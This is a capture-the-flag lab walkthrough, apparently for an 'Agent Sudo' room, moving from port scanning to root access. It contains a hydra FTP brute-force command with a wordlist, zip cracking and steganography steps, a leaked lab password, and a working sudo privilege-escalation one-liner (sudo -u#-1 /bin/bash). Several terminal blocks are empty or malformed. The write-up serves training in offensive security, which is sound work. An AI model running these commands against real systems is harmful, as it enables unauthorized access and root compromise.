## Summary:

  PortScan will give you 3 open ports 21,22 and 80. When we go to port 80 we can see a message to change useragent
  we changed it to C and boom landed upon secret page. From here we logged into ftp and extracted some files. Zip Crack and
  Steganography all the way. Now we have another username and password. Now sudo exploit.

## Walkthrough:

### Enumeration
Lets start with nmap scan

#### Secret Page

So indeed the password is weak let's brute force ssh or ftp

I tried both but got success in vsftpd

```terminal
└──╼ $hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.144.201

```terminal
Let's check files

cat To_agentJ.txt

>Dear agent J,

Another message<br/>
Let's check for Steganography

Binwalk
```terminal

Use john to crack the zip pass then we will get a Message

>Agent C,

Hmmmm interesting let's check where we can put this password
I pretty much stuck but after a thought i got it
```terminal
└──╼ $base64 -d rand.txt
<redacted>
```
hahha worked and got message.txt

>Hi james,

>Glad you find this message. Your login password is hackerrules!

For real i stuck a bit here and ran exploit suggester but got nothing
Then I feel noob when i ran this and my mind sudenly hit
```terminal
james@agent-sudo:/tmp$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
Yup sudo exploit

```terminal
james@agent-sudo:/tmp$ sudo -u#-1 /bin/bash
root@agent-sudo:/tmp#
```

Damn Good Rooted
